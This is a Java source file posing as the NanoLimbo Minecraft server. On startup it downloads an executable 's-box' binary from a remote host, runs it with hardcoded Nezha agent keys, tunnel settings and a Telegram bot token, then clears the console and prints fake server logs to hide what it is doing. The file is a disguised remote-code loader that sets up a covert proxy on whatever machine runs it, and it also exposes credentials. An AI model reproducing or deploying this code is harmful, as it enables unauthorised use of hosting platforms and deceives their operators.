package ua.nanit.limbo;

import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";

    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static final AtomicBoolean forwardLogs = new AtomicBoolean(true);

    private static Process sbxProcess;
    private static final ScheduledExecutorService SCHED = Executors.newScheduledThreadPool(2);

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };

    public static void main(String[] args) {
        try {
            // 检查 Java 版本
            if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
                System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please switch the version!" + ANSI_RESET);
                Thread.sleep(3000);
                System.exit(1);
            }

            // 启动 s-box
            runSbxBinary();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
                SCHED.shutdownNow();
            }));

            System.out.println(ANSI_GREEN + "" + ANSI_RESET);

            // 20秒后清屏 + 停止日志输出 + 打印伪装 LimboServer 日志
            SCHED.schedule(() -> {
                forwardLogs.set(false); // 停止 s-box 日志输出
                resetConsoleAndShowFakeLogs();
            }, 20, TimeUnit.SECONDS);

            // 主线程保持运行
            while (running.get()) {
                Thread.sleep(1000);
            }

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }

    // 启动 s-box
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.PIPE); // 不继承控制台，自己处理

        sbxProcess = pb.start();

        // 前 20 秒输出 s-box 日志
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(sbxProcess.getInputStream()))) {
                String line;
                long startTime = System.currentTimeMillis();
                while ((line = reader.readLine()) != null) {
                    if (forwardLogs.get() && System.currentTimeMillis() - startTime < 20_000) {
                        System.out.println(line);
                    }
                }
            } catch (IOException ignored) {}
        }).start();
    }

    // 清屏并显示伪装 LimboServer 日志
    private static void resetConsoleAndShowFakeLogs() {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                        .inheritIO().start().waitFor();
            } else {
                System.out.print("\033c"); // Reset terminal，清空缓冲区
                System.out.flush();
            }
        } catch (Exception ignored) {}

        System.out.println(ANSI_GREEN + "" + ANSI_RESET);
        printFakeLimboLogs();
    }

    private static void printFakeLimboLogs() {
        String[] logs = {
            "[INFO] [LimboServer] Starting LimboServer v1.0.0 (mock build)",
            "[INFO] [LimboServer] Loading configuration...",
            "[INFO] [LimboServer] Initializing server components...",
            "[INFO] [LimboServer] Preparing world 'world'",
            "[INFO] [LimboServer] Binding to port 25565...",
            "[INFO] [LimboServer] Done (5.123s)! For help, type \"help\"",
            "[INFO] [LimboServer] Server is running in offline mode.",
            "[INFO] [LimboServer] Installation completed successfully."
        };

        for (String log : logs) {
            System.out.println(log);
            try {
                Thread.sleep(1200);
            } catch (InterruptedException ignored) {}
        }
    }

    private static void loadEnvVars(Map<String, String> envVars) {
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
        envVars.put("NEZHA_PORT", "443");
        envVars.put("NEZHA_KEY", "MzLNCJLnhQUC5RUajl");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "7592034407");
        envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
        envVars.put("CFIP", "104.17.98.5");
        envVars.put("CFPORT", "2096");
        envVars.put("NAME", "altr");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/s-box";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }
}
